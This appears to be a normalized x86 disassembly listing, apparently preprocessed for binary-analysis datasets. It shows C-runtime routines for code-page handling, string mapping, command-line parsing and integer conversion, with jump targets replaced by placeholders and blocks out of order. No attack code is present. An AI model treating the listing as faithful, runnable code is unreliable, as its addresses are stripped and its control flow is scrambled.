mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
pop esi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_10080904
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_10080933
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1007f940
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_10080997
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1001462a
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1006e5c0
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1006e5c0
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1007f940
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_10080b27
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_1001da0a
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10080ba3
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_10007442
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_1000b33e
pop ecx
cmp eax ebx
je r-xdata
call sub_10082ff0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_10007442
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_1000b33e
pop ecx
cmp eax ebx
je r-xdata
call sub_10082ff0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_10080d8a
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_10053319
pop ecx
pop edi
sub_10080db0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0xc ] ebx
call sub_1002fb6b
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
push [ esi + 0x58 ]
mov ebx 0x351
push r--data
push [ r--data ]
push 0x3
push ebx
push edi
call sub_100374b5
lea eax [ esi + 0x58 ]
add esp 0x18
mov [ ebp - 0x4 ] r--data
mov [ ebp - 0x8 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
mov eax [ ebp - 0x8 ]
lea ecx [ eax + 0x10 ]
push [ ecx ]
mov [ ebp - 0x8 ] ecx
push [ eax ]
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
push [ eax ]
add [ ebp - 0x4 ] 0xc
push r--data
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
push [ eax ]
push 0x3
push ebx
push edi
call sub_100374b5
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10035d06
pop ecx
push r--data
push ebx
push edi
call sub_100589c2
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push [ esi + 0x54 ]
call sub_10035d06
pop ecx
push [ ebp - 0x10 ]
call sub_10035d06
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10035d06
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10035d06
pop ecx
sub_10080f15
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx ecx
push edi
mov [ ebp - 0x190 ] ebx
mov [ ebp - 0x198 ] eax
call sub_10044649
mov edi eax
push ebx
lea eax [ ebp - 0x1a4 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push [ ebp - 0x198 ]
call sub_1000425a
add esp 0x18
test eax eax
jne r-xdata
shl ebx 0x4
add ebx esi
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fc10
pop ecx
pop ecx
test eax eax
jne r-xdata
xor eax eax
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fa90
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_1002fb6b
pop ecx
pop ecx
mov [ ebp - 0x194 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x48 ]
jmp r-xdata
mov eax [ ebx + 0x48 ]
mov ecx [ ebp - 0x190 ]
mov [ ebp - 0x198 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
mov [ ebp - 0x1a8 ] eax
mov eax [ eax ]
mov [ ebp - 0x1b8 ] eax
lea eax [ ecx + 0x6 ]
imul eax eax 0x6
add eax esi
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c8 ]
push eax
call sub_1007f5d0
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x194 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_10057f0f
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
mov eax [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_1007f5d0
add esp 0xc
cmp [ ebp - 0x190 ] 0x2
jne r-xdata
cmp [ ebp - 0x190 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1a4 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x1f4 ]
mov ecx [ edi + 0x1f0 ]
mov [ ebp - 0x19c ] eax
lea eax [ edi + 0x1d0 ]
mov eax [ ebp - 0x190 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x1a4 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1c0 ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x198 ] rw-data
je r-xdata
mov eax [ ebp - 0x198 ]
push [ ebp - 0x194 ]
mov [ ebx + 0x48 ] eax
call sub_10035d06
mov eax [ ebp - 0x1b8 ]
pop ecx
mov ecx [ ebp - 0x1a8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 + 0x1d0 ]
mov edx [ eax ]
mov [ edi + 0x1d0 ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x1d4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x190 ]
mov eax [ ebp - 0x194 ]
add ecx 0x5
add ecx ecx
mov [ eax ] 0x1
mov [ esi + ecx * 8 ] eax
jmp r-xdata
mov edi [ ebp - 0x190 ]
add edi 0x5
add edi edi
push [ esi + edi * 8 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x1d4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_1001462a
add esp 0x20
test eax eax
je r-xdata
push [ esi + edi * 8 ]
call sub_10035d06
push [ ebx + 0x54 ]
call sub_10035d06
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x1d4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_100044b8
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x1d4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x1d0 ] eax
sub_1008124f
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp ecx ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp eax ebx
je r-xdata
cmp eax ebx
je r-xdata
call sub_10080db0
cmp [ eax ] 0x4c
jne r-xdata
add ecx ecx
mov eax [ esi + ecx * 8 + 0x48 ]
jmp r-xdata
push eax
call sub_10080f15
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea ecx [ ebp - 0x88 ]
push ecx
push eax
call sub_1000425a
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ eax + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
lea edi [ esi + 0x48 ]
cmp [ eax + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_1007fc10
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi eax
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
lea eax [ ebp - 0x88 ]
push eax
mov ecx ebx
call sub_10080f15
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_10051e6e
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_1007fa90
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_1007f580
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_10069c0f
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_1003cbb0
mov ecx [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
mov [ ebp + edi - 0x88 ] al
lea eax [ ebp - 0x88 ]
push eax
call sub_10080f15
pop ecx
test eax eax
je r-xdata
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_100835b0
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_1008146b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_100814a2
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov bl [ esi ]
movzx eax bl
push eax
inc esi
call sub_1002610a
pop ecx
test eax eax
je r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
mov [ ebp + 0xc ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
test bl bl
je r-xdata
inc [ edi ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp bl 0x20
je r-xdata
dec esi
jmp r-xdata
inc esi
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
test edx edx
je r-xdata
cmp bl 0x9
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov [ edx - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
pop esi
pop ebx
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x20
je r-xdata
inc [ ecx ]
leave
retn
and [ eax ] 0x0
inc esi
jmp r-xdata
cmp al 0x9
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ecx ]
mov eax [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ eax ] edx
cmp [ esi ] 0x5c
je r-xdata
inc esi
inc ecx
cmp [ esi ] 0x22
jne r-xdata
test ecx ecx
je r-xdata
test cl 0x1
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
dec ecx
test edx edx
je r-xdata
shr ecx 0x1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test edx edx
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc [ edi ]
test ecx ecx
jne r-xdata
mov [ edx ] 0x5c
inc edx
xor eax eax
xor ebx ebx
cmp [ ebp - 0x4 ] eax
sete al
mov [ ebp - 0x4 ] eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x22
jne r-xdata
inc [ edi ]
mov ecx [ ebp + 0x10 ]
jmp r-xdata
mov [ edx ] 0x0
inc edx
mov [ ebp + 0xc ] edx
test ebx ebx
je r-xdata
cmp al 0x20
je r-xdata
mov [ ebp + 0xc ] edx
mov esi eax
jmp r-xdata
cmp [ esi ] 0x0
je r-xdata
inc esi
jmp r-xdata
movsx eax al
push eax
test edx edx
je r-xdata
cmp al 0x9
je r-xdata
xor ebx ebx
inc ebx
xor ecx ecx
jmp r-xdata
call sub_1002610a
pop ecx
test eax eax
je r-xdata
call sub_1002610a
pop ecx
test eax eax
je r-xdata
inc [ edi ]
mov edx [ ebp + 0xc ]
inc esi
inc [ edi ]
mov ecx [ ebp + 0xc ]
mov al [ esi ]
inc [ ebp + 0xc ]
mov [ ecx ] al
jmp r-xdata
mov al [ esi ]
mov ecx [ ebp + 0xc ]
inc [ ebp + 0xc ]
mov [ ecx ] al
inc esi
inc [ edi ]
sub_1008163c
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_100610eb
add esp 0xc
test eax eax
je r-xdata
call sub_10067d3a
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_1007f5d0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_10081693
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_1000a76c
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_100816c9
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_1005af1f
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_100816b3
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_100816f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x1c ]
call sub_1001da0a
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
test eax eax
je r-xdata
test esi esi
jne r-xdata
mov [ eax ] esi
cmp [ ebp + 0x14 ] 0x0
je r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x10 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x1c ]
push ebx
mov bl [ esi ]
push edi
lea edi [ esi + 0x1 ]
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
mov edx [ ecx + 0xc8 ]
movzx eax bl
movzx eax [ edx + eax * 2 ]
and eax 0x8
lea eax [ ebp - 0x1c ]
push eax
movzx eax bl
push 0x8
push eax
call sub_100079d1
mov ecx [ ebp - 0x1c ]
add esp 0xc
jmp r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
leave
retn
cmp bl 0x2d
jne r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp bl 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
cmp [ ecx + 0xac ] 0x1
jle r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
js r-xdata
mov bl [ edi ]
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ eax ] esi
cmp eax 0x24
jg r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
and [ eax + 0x70 ] 0xfffffffd
test eax eax
jne r-xdata
cmp eax 0x10
jne r-xdata
cmp bl 0x30
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x14 ]
mov esi [ ecx + 0xc8 ]
mov [ ebp - 0x8 ] edx
cmp bl 0x30
jne r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
and ecx 0x103
je r-xdata
movsx ecx bl
sub ecx 0x30
jmp r-xdata
mov al [ edi ]
cmp al 0x78
je r-xdata
mov [ ebp + 0x14 ] 0x10
jmp r-xdata
cmp al 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
test al 0x8
jne r-xdata
lea ecx [ ebx - 0x61 ]
cmp cl 0x19
movsx ecx bl
ja r-xdata
cmp ecx [ ebp + 0x14 ]
jae r-xdata
mov bl [ edi + 0x1 ]
add edi 0x2
cmp al 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
test al 0x4
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
add ecx 0xffffffc9
sub ecx 0x20
or [ ebp + 0x18 ] 0x8
cmp [ ebp - 0x4 ] eax
jb r-xdata
call sub_1006299d
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
and [ ebp - 0x4 ] 0x0
jmp r-xdata
mov edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
imul edx [ ebp + 0x14 ]
add edx ecx
mov [ ebp - 0x4 ] edx
jne r-xdata
test [ ebp + 0x18 ] 0x2
push 0x0
pop eax
setne al
add eax esi
mov [ ebp - 0x4 ] eax
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
mov edx ecx
and edx 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
